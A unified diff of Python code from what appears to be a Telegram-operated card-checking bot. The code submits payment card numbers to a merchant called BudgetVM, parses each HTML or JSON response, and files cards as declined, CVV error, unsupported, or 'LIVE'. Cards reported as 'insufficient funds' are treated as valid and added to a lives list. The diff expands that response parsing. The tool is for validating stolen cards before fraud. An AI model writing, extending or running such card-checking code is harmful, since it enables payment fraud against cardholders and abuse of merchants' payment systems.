@@ -689,52 +689,100 @@ def run_check(chat_id):
             print(f"📡 BudgetVM Response Text: {card_response.text[:200]}...")
             
             # Handle response
-            if card_response.status_code != 200:
-                s["unknown"] += 1
-                s["response"] = f"❌ HTTP Error {card_response.status_code}"
+            print(f"📡 BudgetVM Response Status: {card_response.status_code}")
+            print(f"📡 BudgetVM Response Text: {card_response.text[:200]}...")
+            
+            response_text = card_response.text.lower()
+            
+            # Check for HTML error responses first
+            if "your card was declined" in response_text:
+                s["declined"] += 1
+                s["response"] = "❌ Card was declined"
+                print(f"❌ DECLINED (HTML): {card}")
                 stats[chat_id] = s
                 update_message_safely(chat_id)
                 continue
-                
+            elif "insufficient funds" in response_text:
+                s["approved"] += 1
+                s["response"] = "✅ Insufficient funds (Live)"
+                s["lives"].append(card)
+                print(f"✅ LIVE (Insufficient Funds - HTML): {card}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+            elif "card does not support this type" in response_text or "not supported" in response_text:
+                s["ccn"] += 1
+                s["response"] = "🚫 Card not supported"
+                print(f"🚫 NOT SUPPORTED (HTML): {card}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+            elif "your card's security code is incorrect" in response_text or "incorrect cvc" in response_text:
+                s["cvv"] += 1
+                s["response"] = "⚠️ Incorrect CVC"
+                print(f"⚠️ CVV ERROR (HTML): {card}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+            elif card_response.status_code == 500:
+                s["unknown"] += 1
+                s["response"] = "❌ Server Error (500)"
+                print(f"❌ SERVER ERROR: {card}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+            elif card_response.status_code != 200:
+                s["unknown"] += 1
+                s["response"] = f"❌ HTTP Error {card_response.status_code}"
+                print(f"❌ HTTP ERROR {card_response.status_code}: {card}")
+                stats[chat_id] = s
+                update_message_safely(chat_id)
+                continue
+            
+            # Try to parse JSON response
             try:
                 resp_json = card_response.json()
                 print(f"📨 Parsed JSON: {resp_json}")
+                
+                # Process JSON result
+                result = str(resp_json.get("result", "Unknown"))
+                success = resp_json.get("success", False)
+                
+                print(f"🔍 Processing JSON result - Success: {success}, Result: {result}")
+                
+                if success is True or success == "true":
+                    s["approved"] += 1
+                    s["response"] = f"✅ {result}"
+                    s["lives"].append(card)
+                    print(f"✅ APPROVED (JSON): {card}")
+                elif "does not support" in result.lower() or "blocked" in result.lower() or "not supported" in result.lower():
+                    s["ccn"] += 1
+                    s["response"] = f"🚫 {result}"
+                    print(f"🚫 BLOCKED (JSON): {result}")
+                elif "declined" in result.lower() or "card was declined" in result.lower():
+                    s["declined"] += 1
+                    s["response"] = f"❌ {result}"
+                    print(f"❌ DECLINED (JSON): {result}")
+                elif "insufficient funds" in result.lower():
+                    s["approved"] += 1  # CVV matched but insufficient funds = LIVE
+                    s["response"] = f"✅ {result}"
+                    s["lives"].append(card)
+                    print(f"✅ LIVE (Insufficient Funds - JSON): {card}")
+                elif "incorrect cvc" in result.lower() or "security code" in result.lower():
+                    s["cvv"] += 1
+                    s["response"] = f"⚠️ {result}"
+                    print(f"⚠️ CVV ERROR (JSON): {result}")
+                else:
+                    s["unknown"] += 1
+                    s["response"] = f"⚠️ {result}"
+                    print(f"⚠️ UNKNOWN (JSON): {result}")
+                    
             except:
+                # If not JSON, treat as unknown HTML response
                 s["unknown"] += 1
-                s["response"] = "⚠️ Invalid JSON response"
-                print(f"❌ Failed to parse JSON. Raw response: {card_response.text}")
-                stats[chat_id] = s
-                update_message_safely(chat_id)
-                continue
-
-            # Process result
-            result = str(resp_json.get("result", "Unknown"))
-            success = resp_json.get("success", False)
-            
-            print(f"🔍 Processing result - Success: {success}, Result: {result}")
-            
-            if success is True or success == "true":
-                s["approved"] += 1
-                s["response"] = f"✅ {result}"
-                s["lives"].append(card)
-                print(f"✅ APPROVED: {card}")
-            elif "does not support" in result.lower() or "blocked" in result.lower() or "not supported" in result.lower():
-                s["ccn"] += 1
-                s["response"] = f"🚫 {result}"
-                print(f"🚫 BLOCKED: {result}")
-            elif "declined" in result.lower() or "card was declined" in result.lower():
-                s["declined"] += 1
-                s["response"] = f"❌ {result}"
-                print(f"❌ DECLINED: {result}")
-            elif "insufficient funds" in result.lower():
-                s["approved"] += 1  # CVV matched but insufficient funds = LIVE
-                s["response"] = f"✅ {result}"
-                s["lives"].append(card)
-                print(f"✅ LIVE (Insufficient Funds): {card}")
-            else:
-                s["unknown"] += 1
-                s["response"] = f"⚠️ {result}"
-                print(f"⚠️ UNKNOWN: {result}")
+                s["response"] = "⚠️ Unknown response format"
+                print(f"❌ Failed to parse response for: {card}")
+                print(f"Raw response: {card_response.text[:300]}...")
 
             stats[chat_id] = s
             update_message_safely(chat_id)
